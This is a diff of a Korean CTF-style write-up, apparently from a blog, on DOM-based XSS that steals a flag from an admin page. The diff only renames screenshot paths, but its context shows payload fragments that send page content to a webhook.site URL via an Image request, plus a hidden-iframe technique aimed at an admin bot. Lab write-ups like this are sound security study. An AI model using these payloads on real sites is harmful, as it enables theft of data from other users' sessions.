@@ -23,17 +23,17 @@ header:
 
 ## Steal Info
 
-![취약점 있는 곳](/assets/screenshots/xss-dom-steal/steal1_post.png)
+![취약점 있는 곳](/assets/web-screenshots/xss-dom-steal/steal1_post.png)
 
 게시글 작성 기능 중 **내용(body)** 입력란에 XSS 취약점이 존재함을 확인하였다.
 
-![타겟 할 웹사이트](/assets/screenshots/xss-dom-steal/target_html.png)
+![타겟 할 웹사이트](/assets/web-screenshots/xss-dom-steal/target_html.png)
 
 누구나 접근 가능한 페이지(mypage.html)와 동일한 구조의 관리자 페이지 내부 내 정보 영역에 플래그가 숨겨져 있으나, 직접 접근 시 관리자 권한이 없어 차단되는 구조이다.
 
 확보한 정보를 활용해, 비인가 사용자가 관리자 페이지 내부 정보를 탈취하는 시나리오를 구성하고 공격을 수행할 것 이다.
 
-![플래그가 포함된 DOM 구조](/assets/screenshots/xss-dom-steal/target_card-text.png)
+![플래그가 포함된 DOM 구조](/assets/web-screenshots/xss-dom-steal/target_card-text.png)
 
 위의 `<p class="card-text">` 태그를 이용해, DOM 기반 정보 추출을 시도할 것 이다.
 
@@ -51,15 +51,15 @@ new Image().src = "https://webhook.site/741989d6-cb27-411b-aa44-a01355948028?c="
 </script>
 ```
 
-![페이로드](/assets/screenshots/xss-dom-steal/steal1_payload.png)
+![페이로드](/assets/web-screenshots/xss-dom-steal/steal1_payload.png)
 
 이후 **악성 게시물의 URL을 복사하여 관리자 봇에게 전달**함으로써, 해당 페이지에 접근하도록 유도했다.
 
-![관리자에게 URL 전송](/assets/screenshots/xss-dom-steal/steal1_access_admin.png)
+![관리자에게 URL 전송](/assets/web-screenshots/xss-dom-steal/steal1_access_admin.png)
 
 URL이 정상적으로 전달되었으며, 이후 Webhook 로그를 통해 DOM 정보가 외부로 유출된 것을 확인할 수 있다.
 
-![플래그 획득](/assets/screenshots/xss-dom-steal/steal1_flag.png)
+![플래그 획득](/assets/web-screenshots/xss-dom-steal/steal1_flag.png)
 
 이와 같은 방식으로 **관리자 권한 없이 플래그를 탈취하는 데 성공**하였다.
 
@@ -67,7 +67,7 @@ URL이 정상적으로 전달되었으며, 이후 Webhook 로그를 통해 DOM �
 
 ## Steal Info 2
 
-![타겟 할 곳](/assets/screenshots/xss-dom-steal/steal2_burp_suite.png)
+![타겟 할 곳](/assets/web-screenshots/xss-dom-steal/steal2_burp_suite.png)
 
 위 사진의 `<input id="userInfo">` 요소는 관리자 권한으로 접근할 경우, 해당 필드의 `placeholder` 속성에 플래그가 포함되어 있다.
 
@@ -85,7 +85,7 @@ new Image().src = "https://webhook.site/741989d6-cb27-411b-aa44-a01355948028?c="
 </script>
 ```
 
-![페이로드](/assets/screenshots/xss-dom-steal/steal2_payload.png)
+![페이로드](/assets/web-screenshots/xss-dom-steal/steal2_payload.png)
 
 `iframe`에 `style="display:none"` 속성을 설정하여, **외부 페이지의 DOM 접근과 form 전송은 가능하게 유지하면서도 UI 요소가 노출되지 않도록 구성**했다. 
 
@@ -93,18 +93,18 @@ new Image().src = "https://webhook.site/741989d6-cb27-411b-aa44-a01355948028?c="
 
 - 사용자가 직접 게시물 클릭 시:
 
-![게시물 클릭](/assets/screenshots/xss-dom-steal/steal2_access.png)
+![게시물 클릭](/assets/web-screenshots/xss-dom-steal/steal2_access.png)
 
 게시글을 클릭하면, 삽입된 스크립트를 통해 현재 사용자의 `userInfo` 요소에 설정된 **placeholder 값**인 `"Nothing Here..."`가 Webhook으로 전송되는 것을 확인하였다.
 
 이걸 이용하여 **URL을 복사하여 관리자 봇에게 전달**할 것 이다.
 
-![관리자에게 URL 전송](/assets/screenshots/xss-dom-steal/steal2_access_admin.png)
+![관리자에게 URL 전송](/assets/web-screenshots/xss-dom-steal/steal2_access_admin.png)
 
 관리자 봇에게 XSS가 삽입된 URL을 전달하여 요청을 유도한 후
 
 > **결과:**
 
-![플래그 획득](/assets/screenshots/xss-dom-steal/steal2_flag.png)
+![플래그 획득](/assets/web-screenshots/xss-dom-steal/steal2_flag.png)
 
 **이렇게 관리자 권한 없이 플래그를 획득하는 데 성공했다.**
